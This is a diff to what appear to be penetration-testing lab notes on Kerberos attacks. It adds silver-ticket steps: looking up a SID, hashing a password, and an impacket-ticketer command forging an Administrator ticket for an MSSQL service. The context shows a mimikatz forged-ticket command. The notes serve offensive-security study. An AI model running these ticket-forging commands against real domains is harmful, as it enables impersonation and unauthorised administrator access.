@@ -401,6 +401,20 @@ kerberos::purge
 kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668(domain SID part from whoami /user) /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327(password hash of iis_service) /ptt
 kerberos::list
 ```
+```
+Get Domain user's sid:
+Get-LocalUser -Name 'svc_mssql' | select name,sid
+
+String Convert to NTLM hash:
+https://codebeautify.org/ntlm-hash-generator
+
+Exploiting silver ticket:
+
+impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
+
+export KRB5CCNAME=$PWD/Administrator.ccache
+
+```
 #### Pass the ticket
 >In this attack, an attacker intercepts and steals a valid ticket-granting ticket (TGT) or service ticket (TGS) from a compromised user or service account.
 
